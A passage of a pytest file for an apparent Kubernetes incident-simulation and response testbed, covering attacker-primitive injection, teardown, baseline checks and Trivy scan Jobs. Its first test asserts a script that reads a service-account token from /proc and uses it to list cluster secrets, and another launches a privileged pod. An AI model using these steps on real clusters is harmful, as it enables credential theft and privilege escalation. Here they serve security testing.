    debug_argv = _debug_call(runner)
    assert debug_argv[-3:-1] == ("sh", "-c")
    script = debug_argv[-1]
    assert script.startswith("token=''; for d in /proc/")
    assert SA_MOUNT in script
    assert "Bearer $token" in script
    assert "kubernetes.default.svc" in script
    assert "/api/v1/namespaces/boutique/secrets" in script
    assert '[ "$code" = 200 ]' in script
    assert "--data-binary" not in script  # a GET, no body


def test_privileged_container_launches_a_labelled_privileged_pod_on_the_frontend_image(
    tmp_path: Path,
) -> None:
    runner = FakeProcessRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    event = _attacker_event("SCN-CVE-05", "privileged-container")
    run_id = _run_id("SCN-CVE-05")
    adapter.begin(run_id)
    adapter.apply_event(event, None)

    apply_call = next(call for call in runner.calls if call[0][-3:] == ("apply", "-f", "-"))
    document = json.loads(apply_call[1] or "")
    assert document["kind"] == "Pod"
    assert document["metadata"]["namespace"] == "boutique"
    assert document["metadata"]["labels"] == {
        "agentic-overwatch.io/scenario-id": "SCN-CVE-05",
        "agentic-overwatch.io/run-id": run_id,
    }
    container = document["spec"]["containers"][0]
    assert container["name"] == "privileged-helper"
    assert container["securityContext"]["privileged"] is True
    assert "frontend@sha256:" in container["image"]  # the pinned frontend image, no new pin
    assert (
        "command" not in container
    )  # distroless image: no shell command override; runs entrypoint
    assert not any("restart" in argv for argv, _ in runner.calls)


def test_unknown_attacker_primitive_fails_loudly_and_never_restarts(tmp_path: Path) -> None:
    runner = FakeProcessRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    event = copy.deepcopy(_attacker_event("SCN-SIM-01", "container-shell"))
    event["primitive_id"] = "no-such-primitive"
    adapter.begin(_run_id("SCN-SIM-01"))
    with pytest.raises(ApplyError, match="unknown attacker primitive_id"):
        adapter.apply_event(event, None)
    assert not any("restart" in argv for argv, _ in runner.calls)


def test_workload_mechanism_still_restarts_the_deployment(tmp_path: Path) -> None:
    # No manifest declares a `workload` primitive, so this event is synthesised. It proves the
    # benign workload mechanism (injection_plan.v1.json) is untouched, and that ADR-059 moved only
    # the payload-less ATTACKER primitives off the restart path.
    runner = FakeProcessRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    event = {
        "mechanism": "workload",
        "primitive_id": "benign-perturbation",
        "target": {
            "namespace": "boutique",
            "workload": "cartservice",
            "container": "server",
            "replica_index": 0,
        },
    }
    adapter.begin(_run_id("SCN-SIM-01"))
    adapter.apply_event(event, None)
    restart_argv = next(argv for argv, _ in runner.calls if "restart" in argv)
    assert restart_argv[-3:] == ("rollout", "restart", "deployment/cartservice")
    assert any("status" in argv for argv, _ in runner.calls)


def test_kubectl_adapter_teardown_uses_manifest_order_and_label_cleanup(tmp_path: Path) -> None:
    runner = FakeProcessRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    manifest = planner.load_manifest(SCENARIO)
    adapter.teardown(manifest, RUN_ID)
    mutation_calls = [argv for argv, _ in runner.calls[1:]]
    first_delete = next(argv for argv in mutation_calls if "networkchaos" in argv)
    assert first_delete[-4:] == (
        "networkchaos",
        "network-loss-frontend-to-cart",
        "--ignore-not-found=true",
        "--wait=false",
    )
    selector_calls = [argv for argv in mutation_calls if "-l" in argv]
    assert selector_calls
    scenario_selectors = [
        c for c in selector_calls if "agentic-overwatch.io/managed-by=guardian" not in " ".join(c)
    ]
    assert scenario_selectors
    assert all(
        "agentic-overwatch.io/scenario-id=SCN-SIM-01" in " ".join(c) for c in scenario_selectors
    )


def test_stuck_chaos_cleanup_is_forced_only_when_counts_match(tmp_path: Path) -> None:
    class CleanupRunner(FakeProcessRunner):
        def __call__(self, argv, input_text):
            command = tuple(argv)
            self.calls.append((command, input_text))
            if command[-2:] == ("config", "current-context"):
                return subprocess.CompletedProcess(command, 0, self.context + "\n", "")
            if command[-2:] == ("-o", "json"):
                return subprocess.CompletedProcess(
                    command,
                    0,
                    json.dumps(
                        {
                            "status": {
                                "experiment": {
                                    "containerRecords": [
                                        {
                                            "id": "boutique/gone",
                                            "injectedCount": 0,
                                            "recoveredCount": 0,
                                        }
                                    ]
                                }
                            }
                        }
                    ),
                    "",
                )
            return subprocess.CompletedProcess(command, 0, "ok\n", "")

    runner = CleanupRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    adapter._cleanup_wait_seconds = 1
    adapter._finish_chaos_cleanup("boutique", "httpchaos", "fault")
    assert any(
        "chaos-mesh.chaos-mesh.org/cleanFinalizer=forced" in call for call, _ in runner.calls
    )
    assert any(
        "patch" in call and "/metadata/finalizers" in " ".join(call) for call, _ in runner.calls
    )


def test_stuck_chaos_cleanup_refuses_unrecovered_live_target(tmp_path: Path) -> None:
    class CleanupRunner(FakeProcessRunner):
        def __call__(self, argv, input_text):
            command = tuple(argv)
            self.calls.append((command, input_text))
            if command[-2:] == ("config", "current-context"):
                return subprocess.CompletedProcess(command, 0, self.context + "\n", "")
            if command[-2:] == ("-o", "json"):
                return subprocess.CompletedProcess(
                    command,
                    0,
                    json.dumps(
                        {
                            "status": {
                                "experiment": {
                                    "containerRecords": [
                                        {
                                            "id": "boutique/live-pod",
                                            "injectedCount": 1,
                                            "recoveredCount": 0,
                                        }
                                    ]
                                }
                            }
                        }
                    ),
                    "",
                )
            if "pod" in command and "live-pod" in command:
                return subprocess.CompletedProcess(command, 0, "live\n", "")
            return subprocess.CompletedProcess(command, 0, "ok\n", "")

    adapter = _kubectl_adapter(tmp_path, CleanupRunner())
    adapter._cleanup_wait_seconds = 1
    with pytest.raises(ApplyError, match="still injected on live target"):
        adapter._finish_chaos_cleanup("boutique", "httpchaos", "fault")


def test_kubectl_adapter_surfaces_nonzero_subprocess(tmp_path: Path) -> None:
    runner = FakeProcessRunner()
    runner.fail_on = "get"  # the primitive's first cluster call is the replica pod listing
    adapter = _kubectl_adapter(tmp_path, runner)
    event = next(event for event in _plan("INJ-NONE") if event["mechanism"] == "attacker")
    adapter.begin("RUN-G0-FULL-SCN-SIM-01-INJ-NONE-101")
    with pytest.raises(ApplyError, match="exit 9.*injected failure"):
        adapter.apply_event(event, None)


def test_kubectl_adapter_teardown_continues_after_one_cleanup_failure(tmp_path: Path) -> None:
    runner = FakeProcessRunner()
    runner.fail_on = "configmap,job,networkpolicy,pod,role,rolebinding"
    adapter = _kubectl_adapter(tmp_path, runner)
    with pytest.raises(ApplyError, match="label cleanup"):
        adapter.teardown(planner.load_manifest(SCENARIO), RUN_ID)
    assert any(
        "networkpolicy" in argv and any("managed-by=guardian" in argument for argument in argv)
        for argv, _ in runner.calls
    )
    assert any("status" in argv for argv, _ in runner.calls)


def test_offline_cli_does_not_wait_for_logical_offsets(tmp_path: Path) -> None:
    plan_path = tmp_path / "plan.jsonl"
    plan_path.write_bytes(b"".join(planner.canonical_json_line(event) for event in _plan()))
    assert (
        main(
            [
                "--plan",
                str(plan_path),
                "--run-id",
                RUN_ID,
                "--out",
                str(tmp_path),
                "--offline",
            ]
        )
        == 0
    )
    assert (tmp_path / "injection.log.jsonl").is_file()


def test_live_cli_requires_explicit_context_and_kubeconfig(tmp_path: Path) -> None:
    plan_path = tmp_path / "plan.jsonl"
    plan_path.write_bytes(b"".join(planner.canonical_json_line(event) for event in _plan()))
    with pytest.raises(SystemExit) as caught:
        main(["--plan", str(plan_path), "--run-id", RUN_ID, "--out", str(tmp_path)])
    assert caught.value.code == 2


def test_live_cli_constructs_kubectl_adapter_with_explicit_configuration(
    tmp_path: Path, monkeypatch: Any
) -> None:
    plan_path = tmp_path / "plan.jsonl"
    plan_path.write_bytes(b"".join(planner.canonical_json_line(event) for event in _plan()))
    config = tmp_path / "config"
    config.write_text("apiVersion: v1\n", encoding="utf-8")
    constructed: dict[str, Any] = {}

    class CliAdapter(OfflineAdapter):
        def __init__(self, **kwargs: Any) -> None:
            constructed.update(kwargs)

    monkeypatch.setattr(applier, "KubectlClusterAdapter", CliAdapter)
    monkeypatch.setattr(
        applier, "apply_plan", lambda *args, **kwargs: applier.ApplicationResult((), None)
    )
    assert (
        main(
            [
                "--plan",
                str(plan_path),
                "--run-id",
                RUN_ID,
                "--out",
                str(tmp_path),
                "--kubeconfig",
                str(config),
                "--context",
                "kind-overwatch",
                "--cluster-cli",
                "cluster-cli-custom",
            ]
        )
        == 0
    )
    assert constructed == {
        "kubeconfig": config,
        "context": "kind-overwatch",
        "cluster_cli": "cluster-cli-custom",
    }


# --- ADR-081: a run starts from the baseline and removes what its response created --------------


def _clean_start_event() -> dict[str, Any]:
    """The benign workload event test_workload_mechanism_still_restarts_the_deployment uses."""
    return {
        "mechanism": "workload",
        "primitive_id": "benign-perturbation",
        "target": {
            "namespace": "boutique",
            "workload": "cartservice",
            "container": "server",
            "replica_index": 0,
        },
    }


def test_a_policy_left_in_the_target_namespace_fails_the_run_before_any_mutation(
    tmp_path: Path,
) -> None:
    runner = FakeProcessRunner()
    runner.network_policies = ["containment-frontend-egress"]
    adapter = _kubectl_adapter(tmp_path, runner)
    adapter.begin(RUN_ID)

    with pytest.raises(ApplyError, match="environment not clean.*containment-frontend-egress"):
        adapter.apply_event(_clean_start_event(), None)

    mutating = [
        argv for argv, _ in runner.calls if {"apply", "rollout", "delete", "patch"} & set(argv)
    ]
    assert mutating == [], f"the adapter mutated the cluster before refusing: {mutating}"


def test_a_clean_namespace_is_verified_once_per_run(tmp_path: Path) -> None:
    runner = FakeProcessRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    adapter.begin(RUN_ID)

    adapter.apply_event(_clean_start_event(), None)
    adapter.apply_event(_clean_start_event(), None)

    listings = [argv for argv, _ in runner.calls if "networkpolicies" in argv and "get" in argv]
    assert len(listings) == 1
    assert ("-n", "boutique") == tuple(
        listings[0][listings[0].index("-n") : listings[0].index("-n") + 2]
    )

    adapter.begin(RUN_ID)
    runner.network_policies = ["left-behind"]
    with pytest.raises(ApplyError, match="left-behind"):
        adapter.apply_event(_clean_start_event(), None)


def test_teardown_removes_the_policies_the_guardian_created_for_this_run(tmp_path: Path) -> None:
    runner = FakeProcessRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    manifest = planner.load_manifest(SCENARIO)

    adapter.teardown(manifest, RUN_ID)

    guardian_cleanup = [
        argv
        for argv, _ in runner.calls
        if "delete" in argv
        and "networkpolicy" in argv
        and "agentic-overwatch.io/managed-by=guardian" in " ".join(argv)
    ]
    assert len(guardian_cleanup) == 1
    assert f"agentic-overwatch.io/run-id={RUN_ID}" in " ".join(guardian_cleanup[0])


def test_the_applier_and_the_guardian_spell_the_object_labels_identically() -> None:
    from guardian.app import executor

    assert applier._RUN_LABEL_KEY == executor.RUN_ID_LABEL_KEY
    assert applier._MANAGED_BY_LABEL_KEY == executor.MANAGED_BY_LABEL_KEY
    assert applier._MANAGED_BY_GUARDIAN == executor.MANAGED_BY_GUARDIAN


# --- ADR-098: target replica counts are a restored run boundary -------------------------------


def test_prepare_refuses_a_resized_target_before_scenario_mutation(tmp_path: Path) -> None:
    runner = FakeProcessRunner()
    runner.deployment_replicas["cartservice"] = "0"
    adapter = _kubectl_adapter(tmp_path, runner)
    adapter.begin(RUN_ID)

    with pytest.raises(ApplyError, match=r"cartservice.*spec\.replicas=0.*declares 3"):
        adapter.prepare(_plan(), planner.load_manifest(SCENARIO), RUN_ID)

    mutating = [
        argv
        for argv, _ in runner.calls
        if {"apply", "scale", "delete", "patch"} & set(argv)
        or ("rollout" in argv and "--timeout=120s" not in argv)
    ]
    assert mutating == []


@pytest.mark.parametrize(
    ("returncode", "stdout", "match"),
    ((9, "", "read spec.replicas.*exit 9"), (0, "unknown", "non-integer spec.replicas")),
)
def test_prepare_fails_closed_when_replica_count_cannot_be_read(
    tmp_path: Path, returncode: int, stdout: str, match: str
) -> None:
    class ReplicaReadRunner(FakeProcessRunner):
        def __call__(self, argv, input_text):
            result = super().__call__(argv, input_text)
            if "jsonpath={.spec.replicas}" in argv:
                return subprocess.CompletedProcess(
                    tuple(argv), returncode, stdout, "injected failure"
                )
            return result

    adapter = _kubectl_adapter(tmp_path, ReplicaReadRunner())
    adapter.begin(RUN_ID)
    with pytest.raises(ApplyError, match=match):
        adapter.prepare(_plan(), planner.load_manifest(SCENARIO), RUN_ID)


def test_prepare_refuses_an_unready_target_and_checks_only_once_per_begin(tmp_path: Path) -> None:
    class RolloutRunner(FakeProcessRunner):
        def __init__(self) -> None:
            super().__init__()
            self.fail_rollout = True

        def __call__(self, argv, input_text):
            result = super().__call__(argv, input_text)
            if self.fail_rollout and "rollout" in argv and "--timeout=120s" in argv:
                return subprocess.CompletedProcess(tuple(argv), 9, "", "not ready")
            return result

    runner = RolloutRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    manifest = planner.load_manifest(SCENARIO)
    adapter.begin(RUN_ID)
    with pytest.raises(ApplyError, match=r"verify deployment/cartservice.*ready.*exit 9"):
        adapter.prepare(_plan(), manifest, RUN_ID)

    runner.fail_rollout = False
    adapter.prepare(_plan(), manifest, RUN_ID)
    adapter.prepare(_plan(), manifest, RUN_ID)
    reads = [argv for argv, _ in runner.calls if "jsonpath={.spec.replicas}" in argv]
    assert len(reads) == 2  # failed attempt plus one successful verification

    adapter.begin(RUN_ID)
    adapter.prepare(_plan(), manifest, RUN_ID)
    reads = [argv for argv, _ in runner.calls if "jsonpath={.spec.replicas}" in argv]
    assert len(reads) == 3


def test_teardown_restores_each_declared_target_once_before_waiting_for_rollout(
    tmp_path: Path,
) -> None:
    runner = FakeProcessRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    manifest = copy.deepcopy(planner.load_manifest(SCENARIO))
    extra = copy.deepcopy(manifest["incident_primitives"][0])
    extra["target"].update(workload="frontend", replicas=2)
    manifest["incident_primitives"].append(extra)

    adapter.teardown(manifest, RUN_ID)

    calls = [argv for argv, _ in runner.calls]
    scales = [argv for argv in calls if "scale" in argv]
    assert [argv[-2:] for argv in scales] == [
        ("deployment/cartservice", "--replicas=3"),
        ("deployment/frontend", "--replicas=2"),
    ]
    first_rollout = next(index for index, argv in enumerate(calls) if "rollout" in argv)
    assert all(calls.index(argv) < first_rollout for argv in scales)


def test_teardown_reports_replica_restore_failure_and_continues_recovery(tmp_path: Path) -> None:
    runner = FakeProcessRunner()
    runner.fail_on = "--replicas=3"
    adapter = _kubectl_adapter(tmp_path, runner)
    manifest = copy.deepcopy(planner.load_manifest(SCENARIO))
    extra = copy.deepcopy(manifest["incident_primitives"][0])
    extra["target"].update(workload="frontend", replicas=2)
    manifest["incident_primitives"].append(extra)

    with pytest.raises(ApplyError, match="replica restore cartservice"):
        adapter.teardown(manifest, RUN_ID)

    assert any("--replicas=2" in argv for argv, _ in runner.calls)
    assert any("rollout" in argv and "deployment/cartservice" in argv for argv, _ in runner.calls)


# --- ADR-118: the cve mechanism starts a per-run scan Job; settle waits for its report ----------


CVE_SCENARIO = "SCN-CVE-04"
CVE_RUN_ID = "RUN-G0-FULL-SCN-CVE-04-INJ-NONE-101"
SCAN_SELECTOR = (
    f"agentic-overwatch.io/scenario-id={CVE_SCENARIO},agentic-overwatch.io/run-id={CVE_RUN_ID}"
)


class ScanJobRunner(FakeProcessRunner):
    """Answers each scan Job status read with the next scripted condition list; the last repeats.

    The uploader's exit code is a separate script (``upload_exits``) rather than part of ``states``,
    because it answers a different question: the Job condition says the scan finished, the exit code
    says the aggregator accepted the report. Defaulting it to "0" keeps every test that is not about
    the acknowledgement writing one less thing, and a test that IS about it says so explicitly.
    """

    def __init__(
        self, states: Sequence[str] = ("", "Complete"), upload_exits: Sequence[str] = ("0",)
    ) -> None:
        super().__init__()
        self.states = list(states)
        self.upload_exits = list(upload_exits)
        self.upload_reads: list[tuple[str, ...]] = []

    def __call__(
        self, argv: Sequence[str], input_text: str | None
    ) -> subprocess.CompletedProcess[str]:
        result = super().__call__(argv, input_text)
        command = tuple(argv)
        if "get" in command and any(part.startswith("job-name=") for part in command):
            self.upload_reads.append(command)
            exit_code = (
                self.upload_exits.pop(0) if len(self.upload_exits) > 1 else self.upload_exits[0]
            )
            return subprocess.CompletedProcess(command, 0, exit_code, "")
        if "get" in command and "job" in command:
            state = self.states.pop(0) if len(self.states) > 1 else self.states[0]
            return subprocess.CompletedProcess(command, 0, state + "\n", "")
        return result


def _scan_adapter(
    tmp_path: Path, runner: FakeProcessRunner, *, wait: float = 300.0
) -> KubectlClusterAdapter:
    adapter = _kubectl_adapter(tmp_path, runner)
    adapter._scan_wait_seconds = wait
    adapter._scan_sleeper = lambda _: None
    return adapter


def _vulnerable_image(scenario_id: str = CVE_SCENARIO) -> str:
    """The `repository@digest` the real catalog pins for the scenario's admission primitive."""
    manifest = planner.load_manifest(scenario_id)
    ref = next(p["ref"] for p in manifest["incident_primitives"] if p["mechanism"] == "cve")
    entry = KubectlClusterAdapter._load_cve_entry(ref, scenario_id)
    return f"{entry['repository']}@{entry['digest']}"


def _trivy_pin() -> str:
    for line in applier.VERSIONS_ENV_FILE.read_text(encoding="utf-8").splitlines():
        if line.startswith("TRIVY_VERSION="):
            return line.split("=", 1)[1].strip()
    raise AssertionError("TRIVY_VERSION is not pinned in infra/versions.env")


def _created_documents(runner: FakeProcessRunner) -> list[dict[str, Any]]:
    return [
        json.loads(data or "") for argv, data in runner.calls if argv[-3:] == ("create", "-f", "-")
    ]


def _is_status_read(argv: tuple[str, ...]) -> bool:
    return "get" in argv and "job" in argv


def test_cve_admission_creates_the_rendered_per_run_scan_job_after_rollout(
    tmp_path: Path,
) -> None:
    runner = ScanJobRunner()
    adapter = _scan_adapter(tmp_path, runner)
    events = planner.plan_cell(CVE_SCENARIO, "INJ-NONE", 101)
    event = next(event for event in events if event["mechanism"] == "cve")
    adapter.begin(CVE_RUN_ID)
    detail = adapter.apply_event(event, None)

    image = _vulnerable_image()
    job_name = "trivy-image-scan-" + CVE_RUN_ID.lower()
    calls = [argv for argv, _ in runner.calls]
    patch = next(i for i, argv in enumerate(calls) if "patch" in argv)
    rollout = next(i for i, argv in enumerate(calls) if "rollout" in argv and i > patch)
    stale = next(i for i, argv in enumerate(calls) if "delete" in argv and "job" in argv)
    create = next(i for i, argv in enumerate(calls) if argv[-3:] == ("create", "-f", "-"))
    # The scan starts only once the vulnerable image is rolled out, and never reuses a Job an
    # earlier attempt of this run id left behind.
    assert patch < rollout < stale < create
    assert calls[stale][5:] == (
        "-n",
        "monitor",
        "delete",
        "job",
        job_name,
        "--ignore-not-found=true",
        "--cascade=foreground",
        "--wait=true",
    )

    [job] = _created_documents(runner)
    assert job["kind"] == "Job"
    assert job["metadata"]["name"] == job_name
    assert job["metadata"]["namespace"] == "monitor"
    labels = {
        "agentic-overwatch.io/scenario-id": CVE_SCENARIO,
        "agentic-overwatch.io/run-id": CVE_RUN_ID,
    }
    assert labels.items() <= job["metadata"]["labels"].items()
    assert labels.items() <= job["spec"]["template"]["metadata"]["labels"].items()
    pod = job["spec"]["template"]["spec"]
    [trivy] = pod["initContainers"]
    # One pin, read from infra/versions.env; the scan subject is the exact image the patch admitted.
    assert trivy["image"] == f"docker.io/aquasec/trivy:{_trivy_pin()}"
    env = {item["name"]: item["value"] for item in trivy["env"]}
    assert env["TARGET_IMAGE"] == image
    patch_body = json.loads(calls[patch][calls[patch].index("-p") + 1])
    assert patch_body["spec"]["template"]["spec"]["containers"][0]["image"] == image
    # Read from the node's containerd store, never a registry the pod cannot reach.
    assert env["CONTAINERD_NAMESPACE"] == "k8s.io"
    assert trivy["args"][:3] == ["image", "--image-src", "containerd"]
    assert trivy["args"][-1] == "$(TARGET_IMAGE)"
    socket = next(volume for volume in pod["volumes"] if volume["name"] == "containerd-socket")
    assert socket["hostPath"] == {"path": "/run/containerd/containerd.sock", "type": "Socket"}
    [uploader] = pod["containers"]
    assert uploader["command"] == ["python", "-m", "monitor.trivy_uploader"]
    assert {
        "name": "MONITOR_TRIVY_URL",
        "value": "http://evidence-aggregator.monitor.svc.cluster.local:8080/v1/trivy",
    } in uploader["env"]
    assert all(mount["name"] != "containerd-socket" for mount in uploader["volumeMounts"])
    assert pod["automountServiceAccountToken"] is False
    assert "_TOKEN" not in json.dumps(job)
    assert f"monitor/{job_name}" in detail
    # Creating the Job does not wait for it: the incident keeps its planned offsets.
    assert not any(_is_status_read(argv) for argv in calls)


def test_a_cve_plan_settles_the_scan_before_the_response_phase(tmp_path: Path) -> None:
    runner = ScanJobRunner(states=("", "", "Complete"))
    adapter = _scan_adapter(tmp_path, runner)
    events = planner.plan_cell(CVE_SCENARIO, "INJ-NONE", 101)
    responded_at: list[int] = []

    result = apply_plan(
        events,
        CVE_RUN_ID,
        adapter=adapter,
        sleeper=lambda _: None,
        monotonic=lambda: 1_000_000.0,
        wall_clock=_wall_clock,
        before_teardown=lambda records: responded_at.append(len(runner.calls)),
    )

    assert result.succeeded, result.error
    assert [record["applied"]["outcome"] for record in result.records] == ["applied"] * len(events)
    calls = [argv for argv, _ in runner.calls]
    reads = [i for i, argv in enumerate(calls) if _is_status_read(argv)]
    assert len(reads) == 3  # two pending reads, then Complete
    beacon = max(i for i, argv in enumerate(calls) if "debug" in argv)  # the plan's last event
    # settle runs after the last event and before the runner's evidence export and response.
    assert beacon < reads[0] and reads[-1] < responded_at[0]
    teardown_deletes = [
        argv
        for argv in calls[responded_at[0] :]
        if "delete" in argv and "job" in argv and "-l" in argv and "monitor" in argv
    ]
    assert len(teardown_deletes) == 1
    assert SCAN_SELECTOR in teardown_deletes[0]


@pytest.mark.parametrize(
    ("states", "wait", "match"),
    (
        (("", "Failed"), 300.0, "failed; its report never reached the aggregator"),
        (("",), 3.0, "did not finish within 3s"),
    ),
)
def test_a_scan_that_never_delivers_fails_the_run_after_response_and_teardown(
    tmp_path: Path, states: tuple[str, ...], wait: float, match: str
) -> None:
    runner = ScanJobRunner(states=states)
    adapter = _scan_adapter(tmp_path, runner, wait=wait)
    responded: list[bool] = []
    result = apply_plan(
        planner.plan_cell(CVE_SCENARIO, "INJ-NONE", 101),
        CVE_RUN_ID,
        adapter=adapter,
        sleeper=lambda _: None,
        monotonic=lambda: 1_000_000.0,
        wall_clock=_wall_clock,
        before_teardown=lambda records: responded.append(True),
    )
    assert not result.succeeded
    assert result.error is not None and result.error.startswith("settle failed: ApplyError")
    assert match in result.error
    assert responded == [True]
    assert any(SCAN_SELECTOR in argv and "job" in argv for argv, _ in runner.calls)


def test_a_non_cve_teardown_touches_no_monitor_job(tmp_path: Path) -> None:
    runner = FakeProcessRunner()
    adapter = _kubectl_adapter(tmp_path, runner)
    adapter.teardown(planner.load_manifest(SCENARIO), RUN_ID)
    assert not any("monitor" in argv for argv, _ in runner.calls)


def test_scan_job_render_refuses_a_name_the_job_controller_would_reject() -> None:
    image = _vulnerable_image()
    longest = "RUN-G2-SHAREDCRED-SCN-CVE-04-INJ-NONE-101-R100"
    job = applier.render_trivy_scan_job(longest, CVE_SCENARIO, image)
    assert len(job["metadata"]["name"]) == 63
    with pytest.raises(ApplyError, match="caps at 63"):
        applier.render_trivy_scan_job(longest + "0", CVE_SCENARIO, image)
    with pytest.raises(ApplyError, match="not a canonical run id"):
        applier.render_trivy_scan_job("run-lowercase", CVE_SCENARIO, image)


def test_scan_job_render_refuses_a_template_that_drifted_from_its_renderer(
    tmp_path: Path, monkeypatch: Any
) -> None:
    template = applier.TRIVY_SCAN_TEMPLATE.read_text(encoding="utf-8")
    other = "registry.example/other@sha256:" + "b" * 64
    hard_coded = tmp_path / "hard-coded.yaml"
    hard_coded.write_text(template.replace("TARGET_IMAGE_TOKEN", other), encoding="utf-8")
    monkeypatch.setattr(applier, "TRIVY_SCAN_TEMPLATE", hard_coded)
    with pytest.raises(ApplyError, match="no longer carries TARGET_IMAGE_TOKEN"):
        applier.render_trivy_scan_job(CVE_RUN_ID, CVE_SCENARIO, _vulnerable_image())

    unknown = tmp_path / "unknown.yaml"
    unknown.write_text(
        template.replace("value: k8s.io", "value: NEW_NAMESPACE_TOKEN"), encoding="utf-8"
    )
    monkeypatch.setattr(applier, "TRIVY_SCAN_TEMPLATE", unknown)
    with pytest.raises(ApplyError, match="unrendered NEW_NAMESPACE_TOKEN"):
        applier.render_trivy_scan_job(CVE_RUN_ID, CVE_SCENARIO, _vulnerable_image())


def test_scan_job_render_fails_closed_without_the_trivy_pin(
    tmp_path: Path, monkeypatch: Any
) -> None:
    versions = tmp_path / "versions.env"
    versions.write_text("TRIVY_VERSION=\n", encoding="utf-8")
    monkeypatch.setattr(applier, "VERSIONS_ENV_FILE", versions)
    with pytest.raises(ApplyError, match="TRIVY_VERSION is absent or empty"):
        applier.render_trivy_scan_job(CVE_RUN_ID, CVE_SCENARIO, _vulnerable_image())


# --- M10 WS-2: admission first, and settle waits for the UPLOAD ---


@pytest.mark.parametrize("scenario_id", ("SCN-CVE-04", "SCN-CVE-05"))
def test_cve_incident_primitives_place_admission_first(scenario_id: str) -> None:
    """The `cve` primitive is the first incident primitive, and the planner refuses a manifest where
    it is not (ADR-118; the plan's WS-2 row on apply.py).

    This is a property of the CLUSTER, not of the plan: the Trivy scan reads the node's containerd
    store for the admitted digest, and SCN-CVE-05's exploit reaches a library that is only
    vulnerable once that digest is running. A manifest that listed the admission second would still
    validate, still plan and still seal -- it would simply be a different scenario from the one its
    `first_signal_source: trivy`, its detection labels and its phase coverage describe.

    The second half is what makes the first half binding: `assert_cve_admission_first` is called on
    every plan and again by the applier, so a manifest edited into the wrong order fails the planner
    rather than producing a corpus of runs that quietly are not CVE scenarios.
    """
    manifest = planner.load_manifest(scenario_id)
    first = manifest["incident_primitives"][0]
    assert first["mechanism"] == "cve", (
        f"{scenario_id}: the first incident primitive is {first['primitive_id']!r} "
        f"({first['mechanism']}), so the vulnerable image is not resident when the incident starts"
    )
    admissions = [p for p in manifest["incident_primitives"] if p["mechanism"] == "cve"]
    assert len(admissions) == 1, f"{scenario_id}: {len(admissions)} admission primitives"
    # The planned order is the manifest's order: the admission is the first planned event.
    events = planner.plan_cell(scenario_id, "INJ-NONE", 101)
    assert events[0]["mechanism"] == "cve"
    assert events[0]["primitive_id"] == first["primitive_id"]

    reordered = [*(manifest["incident_primitives"][1:]), first]
    with pytest.raises(planner.PlanError, match="not first"):
        planner.assert_cve_admission_first(
            scenario_id, [str(item["mechanism"]) for item in reordered]
        )
    # A non-CVE scenario that admits a CVE image is the other direction of the same mistake.
    with pytest.raises(planner.PlanError, match="is not a CVE scenario"):
        planner.assert_cve_admission_first("SCN-SIM-01", ["cve", "attacker"])
    # ... and a CVE scenario with no admission cannot produce the trivy first signal its
    # ground truth names.
    with pytest.raises(planner.PlanError, match="declares no `cve` admission primitive"):
        planner.assert_cve_admission_first("SCN-CVE-04", ["attacker", "chaosmesh"])


def test_cve_admission_first_is_enforced_on_the_applied_plan_too() -> None:
    """The applier re-checks it, because it reads a plan FILE rather than calling the planner.

    A hand-written or post-processed plan that reordered the admission would otherwise be applied
    to a live cluster: the applier is the component that rolls a pinned vulnerable image onto a
    running Deployment, so the assertion has to be on its path and not only on the planner's.
    """
    events = list(planner.plan_cell(CVE_SCENARIO, "INJ-NONE", 101))
    admission = events[0]
    following = events[1]
    # Renumber the two so the plan is internally consistent -- strict (offset_ms, event_rank,
    # event_id) order, contiguous ranks -- and the admission is still not first. A hand-edited plan
    # file looks exactly like this: valid order, wrong incident.
    swapped = []
    for rank, event in enumerate((following, admission)):
        moved = dict(event)
        moved["event_rank"] = rank
        moved["offset_ms"] = (rank + 1) * planner.STEP_MS
        swapped.append(moved)
    with pytest.raises(ApplyError, match="is at position 1, not first"):
        apply_plan(
            swapped,
            CVE_RUN_ID,
            adapter=OfflineAdapter(),
            sleeper=lambda _: None,
            monotonic=lambda: 1_000_000.0,
            wall_clock=_wall_clock,
        )


def test_settle_waits_for_scan_upload(tmp_path: Path) -> None:
    """A Complete Job is not enough: the uploader's own exit code is the acknowledgement.

    Two waits, two questions. The Job condition says the scan finished; the uploader's terminated
    exit code says the aggregator accepted the report, and the report IS this scenario's first
    signal. At v1 every CVE bundle sealed with no trivy event at all (defect V4), and a settle that
    inferred the upload from the Job's status is exactly the inference that would let that happen
    again the first time the aggregator refused a report.

    The negative case is therefore the interesting one: a Job that reached Complete and whose
    uploader
    exited non-zero fails the run, and it does so AFTER the last event and BEFORE teardown, so the
    runner's evidence export and the response phase never see a window without the report.
    """
    runner = ScanJobRunner(states=("", "Complete"), upload_exits=("0",))
    adapter = _scan_adapter(tmp_path, runner)
    responded: list[int] = []
    result = apply_plan(
        planner.plan_cell(CVE_SCENARIO, "INJ-NONE", 101),
        CVE_RUN_ID,
        adapter=adapter,
        sleeper=lambda _: None,
        monotonic=lambda: 1_000_000.0,
        wall_clock=_wall_clock,
        before_teardown=lambda records: responded.append(len(runner.calls)),
    )
    assert result.succeeded, result.error
    assert len(runner.upload_reads) == 1, "the acknowledgement was never read"
    acknowledgement = runner.upload_reads[0]
    assert "pods" in acknowledgement, "the uploader's container status is on its pod, not the Job"
    assert any(part.startswith("job-name=trivy-image-scan-") for part in acknowledgement)
    assert "uploader" in acknowledgement[-1], "the read must name the uploader container"
    # It happened after the last planned event and before the response phase.
    calls = [argv for argv, _ in runner.calls]
    beacon = max(i for i, argv in enumerate(calls) if "debug" in argv)
    assert beacon < calls.index(acknowledgement) < responded[0]


@pytest.mark.parametrize(
    ("exit_code", "match"),
    (
        ("1", "did not report a successful upload"),
        ("", "did not report a successful upload"),
    ),
)
def test_a_scan_the_aggregator_refused_fails_the_run(
    tmp_path: Path, exit_code: str, match: str
) -> None:
    runner = ScanJobRunner(states=("", "Complete"), upload_exits=(exit_code,))
    adapter = _scan_adapter(tmp_path, runner)
    responded: list[bool] = []
    result = apply_plan(
        planner.plan_cell(CVE_SCENARIO, "INJ-NONE", 101),
        CVE_RUN_ID,
        adapter=adapter,
        sleeper=lambda _: None,
